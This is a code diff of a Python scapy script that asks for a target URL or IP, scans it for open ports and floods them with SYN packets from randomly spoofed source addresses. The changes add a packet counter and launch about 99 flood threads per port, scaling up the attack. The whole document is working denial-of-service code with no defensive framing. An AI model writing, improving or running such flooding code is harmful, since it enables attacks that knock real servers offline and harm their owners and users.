@@ -30,6 +30,7 @@ def portScan(ip):
         t.join()
 
 def synAttack(ip, port):
+    count = 0
     while 1:
         i = IP()
         i.src = str(random.randint(1,254))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254))
@@ -42,14 +43,16 @@ def synAttack(ip, port):
         t.flags = 'S'
 
         send(i/t)
-        print("Send "+str(ip)+":"+str(port)+" a SYN packets")
+        count = count + 1 
+        print("Send "+str(ip)+":"+str(port)+" a SYN packets, Count："+str(count))
 
 
 def setSynAttack(ip, portList):
     for port in portList:
-        thread = threading.Thread(target = synAttack, args = (ip, port))
-        thread.start()
-        time.sleep(0.05)   
+        for i in range(1,100):
+            thread = threading.Thread(target = synAttack, args = (ip, port))
+            thread.start()
+            time.sleep(0.05)   
 
 def main():
     domainName = input("輸入要攻擊的URL或IP：\n")
@@ -68,8 +71,6 @@ def main():
     print("-" * 60)
 
     setSynAttack(serverIP,openPort)
-
-
 
 
 main()
